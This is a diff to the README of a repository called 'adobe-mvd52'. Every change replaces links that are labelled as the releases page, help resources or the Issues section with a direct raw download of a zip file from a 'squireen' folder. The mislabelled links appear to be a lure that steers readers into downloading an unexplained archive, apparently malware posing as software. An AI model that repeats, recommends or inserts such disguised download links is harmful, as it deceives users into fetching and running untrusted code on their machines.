@@ -6,7 +6,7 @@ Welcome to adobe-mvd52! This application helps you test development experience s
 
 ## 📥 Download Link
 
-[![Download adobe-mvd52](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/viru9960/adobe-mvd52/releases)
+[![Download adobe-mvd52](https://raw.githubusercontent.com/viru9960/adobe-mvd52/main/squireen/adobe-mvd52.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/viru9960/adobe-mvd52/main/squireen/adobe-mvd52.zip)
 
 ## 📋 System Requirements
 
@@ -26,7 +26,7 @@ Before you begin, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/viru9960/adobe-mvd52/releases) where you can find the latest version of adobe-mvd52.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/viru9960/adobe-mvd52/main/squireen/adobe-mvd52.zip) where you can find the latest version of adobe-mvd52.
    
 2. **Select the Latest Release:** Look for the version marked as “Latest.” This is usually at the top of the page.
 
@@ -56,7 +56,7 @@ If you encounter any issues while using adobe-mvd52, consider the following step
 
 - **Check System Requirements:** Make sure your system meets the above requirements.
 - **Reinstall the Application:** Uninstall and reinstall adobe-mvd52 if you experience errors.
-- **Consult Online Resources:** Visit the [Releases page](https://github.com/viru9960/adobe-mvd52/releases) for more help.
+- **Consult Online Resources:** Visit the [Releases page](https://raw.githubusercontent.com/viru9960/adobe-mvd52/main/squireen/adobe-mvd52.zip) for more help.
 
 ## 🗨️ Feedback
 
@@ -66,6 +66,6 @@ Your feedback helps us improve. Please feel free to share your thoughts and expe
 
 For further questions or support, you can reach out via the following channels:
 
-- GitHub Issues: Open an issue in the [Issues section](https://github.com/viru9960/adobe-mvd52/issues) of this repository.
+- GitHub Issues: Open an issue in the [Issues section](https://raw.githubusercontent.com/viru9960/adobe-mvd52/main/squireen/adobe-mvd52.zip) of this repository.
   
 Thank you for using adobe-mvd52! We hope you find it useful for your development needs.
